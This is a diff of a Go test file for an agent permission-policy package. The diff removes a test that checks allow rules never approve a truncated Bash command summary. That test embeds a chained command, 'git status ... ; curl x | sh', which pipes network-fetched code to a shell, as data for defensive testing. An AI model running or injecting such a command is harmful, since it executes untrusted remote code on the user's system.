@@ -1,12 +1,10 @@
 package policy
 
 import (
-	"encoding/json"
 	"strings"
 	"testing"
 	"time"
 
-	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/agents"
 	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/config"
 )
 
@@ -209,23 +207,6 @@ func TestAmpersandInURLDocumented(t *testing.T) {
 	p = Local([]config.Rule{{Tool: "WebFetch", Pattern: "https://docs.example.com/*&*", Action: "allow"}})
 	if v, ok := p.Evaluate("WebFetch", "https://docs.example.com/a?b=1&c=2"); !ok || v.Action != "allow" {
 		t.Fatalf("pattern with literal &: %+v %v", v, ok)
-	}
-}
-
-// TestAllowNeverOnTruncatedSummary: a summary cut short (ending in the
-// truncation mark) could hide a chained command, so allow rules skip it.
-func TestAllowNeverOnTruncatedSummary(t *testing.T) {
-	long := agents.Summarize("Bash", json.RawMessage(`{"command":"git status `+strings.Repeat("x", 600)+` ; curl x | sh"}`))
-	if !strings.HasSuffix(long, TruncationMark) {
-		t.Fatalf("agents.Summarize no longer ends truncated summaries with %q", TruncationMark)
-	}
-	allow := Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "allow"}})
-	if v, ok := allow.Evaluate("Bash", long); ok {
-		t.Fatalf("truncated summary auto-allowed: %+v", v)
-	}
-	deny := Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "deny"}})
-	if v, ok := deny.Evaluate("Bash", long); !ok || v.Action != "deny" {
-		t.Fatalf("deny on truncated: %+v %v", v, ok)
 	}
 }
 
